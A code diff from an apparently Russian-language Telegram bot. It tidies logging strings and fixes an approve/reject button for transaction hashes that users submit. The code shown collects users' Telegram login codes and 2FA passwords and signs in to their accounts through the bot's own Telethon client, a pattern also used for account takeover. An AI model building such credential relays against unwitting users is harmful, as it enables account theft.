@@ -792,7 +792,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await client_telethon.sign_in(context.user_data['phone'], text, phone_code_hash=context.user_data['phone_code_hash'])
             await update.message.reply_text(texts['auth_success'])
             del context.user_data['waiting_for_code']
-            await log_to_channel(context, f"Успешная авторизация", username)
+            await log_to_channel(context, "Успешная авторизация", username)
             keyboard = [
                 [InlineKeyboardButton("Русский", callback_data='lang_Русский')],
                 [InlineKeyboardButton("Украинский", callback_data='lang_Украинский')],
@@ -804,7 +804,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(texts['enter_password'])
             context.user_data['waiting_for_password'] = True
             del context.user_data['waiting_for_code']
-            await log_to_channel(context, f"Запрос пароля 2FA", username)
+            await log_to_channel(context, "Запрос пароля 2FA", username)
         except telethon_errors.RPCError as e:
             await update.message.reply_text(texts['auth_error'].format(error=str(e)))
             await log_to_channel(context, f"Ошибка ввода кода: {str(e)}", username)
@@ -821,7 +821,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await client_telethon.sign_in(password=text)
             await update.message.reply_text(texts['auth_success'])
             del context.user_data['waiting_for_password']
-            await log_to_channel(context, f"Успешная авторизация с 2FA", username)
+            await log_to_channel(context, "Успешная авторизация с 2FA", username)
             keyboard = [
                 [InlineKeyboardButton("Русский", callback_data='lang_Русский')],
                 [InlineKeyboardButton("Украинский", callback_data='lang_Украинский')],
@@ -862,7 +862,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await context.bot.send_message(
                     chat_id=admin_id,
                     text=f"Пользователь {name} (@{username}) (ID: {user_id}) отправил хэш транзакции:\n{text}",
-                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton  InlineKeyboardButton("Отклонить", callback_data=f'reject_{user_id}')]])
+                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Одобрить", callback_data=f'approve_{user_id}'), InlineKeyboardButton("Отклонить", callback_data=f'reject_{user_id}')]])
                 )
             except telegram_error.BadRequest as e:
                 print(f"Ошибка отправки хэша администратору {admin_id}: {e}")
